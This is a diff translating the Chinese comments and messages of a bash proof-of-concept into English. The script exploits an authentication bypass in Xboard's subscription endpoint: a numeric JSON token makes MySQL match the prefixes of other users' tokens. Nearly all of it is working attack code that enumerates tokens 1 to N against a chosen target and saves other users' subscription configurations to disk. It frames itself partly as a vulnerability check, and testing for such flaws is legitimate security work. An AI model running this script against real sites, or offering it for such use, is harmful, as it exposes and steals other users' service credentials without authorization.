@@ -1,16 +1,18 @@
 #!/usr/bin/env bash
 #
-# Xboard <= e68fec5^ 订阅 token 认证绕过 PoC（通用版）
+# Xboard <= e68fec5^ Subscription Token Authentication Bypass PoC (general-purpose)
 # made by @pingzicloud1234
 #
-# 原理：旧 Client 中间件 $request->input('token') 取值后不做类型校验，
-#       直接 User::where('token', $token)->first()。把 token 以 JSON
-#       数字放 body，PHP 得到 int，MySQL 比较 CHAR(32) 时会把列值转成
-#       数字，于是 token=44155 命中所有 "44155xxxx..." 的 token 并返回
-#       其中任意一条（first()），无需完整 token。
+# How it works: the old Client middleware reads $request->input('token') without
+# validating its type, then calls User::where('token', $token)->first() directly.
+# Sending the token as a JSON number in the body gives PHP an int. When comparing
+# it against CHAR(32), MySQL converts the column value to a number, so token=44155
+# matches all "44155xxxx..." tokens and returns an arbitrary matching record
+# (first()), without requiring the full token.
 #
-# 必须用 body 且数字不加引号：query 里是字符串，MySQL 按字符串比较，
-# 不会命中。token=0 因旧代码 empty(0) 为真而 403，所以从 1 开始。
+# Use the request body with an unquoted number: query parameters are strings,
+# so MySQL compares them as strings and finds no match. token=0 returns 403
+# because empty(0) is true in the old code, so start at 1.
 
 set -uo pipefail
 
@@ -26,20 +28,20 @@ OUTDIR="./out"
 
 usage() {
   cat <<EOF
-用法: $PROG -u https://target.com [选项]
+Usage: $PROG -u https://target.com [options]
 
-  -u URL     目标站点根地址（必填，如 https://example.com）
-  -p PATH    订阅接口路径（默认 /api/v1/client/subscribe）
-  -f FLAG    订阅格式（默认 clashmeta，可换 clash/singbox/surge/v2ray）
-  -n NUM     数字 token 上限，从 1 试到 NUM（默认 99，越大越慢越全）
-  -o DIR     命中内容保存目录（默认 ./out）
-  -k         忽略 TLS 证书错误
-  -v         显示每个失败请求
-  -h         帮助
+  -u URL     Target site's base URL (required, e.g. https://example.com)
+  -p PATH    Subscription endpoint path (default: /api/v1/client/subscribe)
+  -f FLAG    Subscription format (default: clashmeta; alternatives: clash/singbox/surge/v2ray)
+  -n NUM     Maximum numeric token; try 1 through NUM (default: 99; larger is slower but more thorough)
+  -o DIR     Directory for saving matching responses (default: ./out)
+  -k         Ignore TLS certificate errors
+  -v         Show every failed request
+  -h         Show help
 
-退出码: 0=存在漏洞, 1=未命中/已修复, 2=参数错误
+Exit codes: 0=vulnerable, 1=no hits/patched, 2=invalid arguments
 
-示例:
+Examples:
   $PROG -u https://example.com
   $PROG -u https://example.com -f singbox -n 999
 
@@ -57,14 +59,14 @@ while getopts ':u:p:f:n:o:kvh' opt; do
     k) INSECURE=1 ;;
     v) VERBOSE=1 ;;
     h) usage; exit 0 ;;
-    :) echo "$PROG: -$OPTARG 需要参数" >&2; usage; exit 2 ;;
-    *) echo "$PROG: 未知选项 -$OPTARG" >&2; usage; exit 2 ;;
+    :) echo "$PROG: -$OPTARG requires an argument" >&2; usage; exit 2 ;;
+    *) echo "$PROG: unknown option -$OPTARG" >&2; usage; exit 2 ;;
   esac
 done
 
 [ -n "$URL" ] || { usage; exit 2; }
-case "$MAX" in ''|*[!0-9]*) echo "$PROG: -n 必须是正整数" >&2; exit 2 ;; esac
-[ "$MAX" -ge 1 ] || { echo "$PROG: -n 必须 >= 1" >&2; exit 2; }
+case "$MAX" in ''|*[!0-9]*) echo "$PROG: -n must be a positive integer" >&2; exit 2 ;; esac
+[ "$MAX" -ge 1 ] || { echo "$PROG: -n must be >= 1" >&2; exit 2; }
 
 URL="${URL%/}"
 ENDPOINT="$URL/${PATH_OVERRIDE#/}"
@@ -104,9 +106,9 @@ for n in $(seq 1 "$MAX"); do
     hit=$((hit + 1))
     if looks_like_sub "$body"; then
       primary=$(grep -aom1 -E '^\s*-?\s*name:.*|^\s*#.*' "$body" | sed 's/^[[:space:]]*//' | cut -c1-60)
-      printf '  [HIT] token=%-5s -> 200  %6s bytes  %s\n' "$n" "$size" "${primary:-<订阅>}"
+      printf '  [HIT] token=%-5s -> 200  %6s bytes  %s\n' "$n" "$size" "${primary:-<subscription>}"
     else
-      printf '  [?]   token=%-5s -> 200  %6s bytes  (内容不似订阅)\n' "$n" "$size"
+      printf '  [?]   token=%-5s -> 200  %6s bytes  (content does not look like a subscription)\n' "$n" "$size"
     fi
     [ "$SAVE" = 1 ] || cp "$body" "./token_$n.txt"
   else
@@ -122,14 +124,14 @@ done
 
 echo
 if [ "$hit" -gt 0 ]; then
-  echo "[!] VULNERABLE: $tried 次请求命中 $hit 个数字 token，耗时 ${SECONDS}s"
-  echo "    命中响应即任意用户的订阅；修复后同样请求应全部 403。"
-  [ "$SAVE" = 1 ] && echo "    内容已保存到 $OUTDIR/  （实例配置只在这里，不在脚本里）"
+  echo "[!] VULNERABLE: $hit numeric tokens matched in $tried requests, elapsed ${SECONDS}s"
+  echo "    Matching responses contain arbitrary users' subscriptions; after patching, all these requests should return 403."
+  [ "$SAVE" = 1 ] && echo "    Content saved to $OUTDIR/  (instance configuration is stored here only, not in the script)"
   exit 0
 fi
 
-echo "[+] 未命中：$tried 次请求均未返回订阅，耗时 ${SECONDS}s"
-echo "    - e68fec5 及以后版本：预期结果，已修复。"
-echo "    - 旧版本仍失败：可能非 Xboard、有 WAF、或数字前缀都超过 $MAX，可加大 -n 重试。"
-echo "    - 可加 -v 看状态码，或用真实完整 token 复核接口是否正常。"
+echo "[+] No hits: none of the $tried requests returned a subscription, elapsed ${SECONDS}s"
+echo "    - e68fec5 and later: expected result; the vulnerability is patched."
+echo "    - If an older version still fails: the site may not be Xboard, a WAF may be present, or all numeric prefixes may exceed $MAX; increase -n and try again."
+echo "    - Add -v to see status codes, or use a valid full token to verify that the endpoint works."
 exit 1
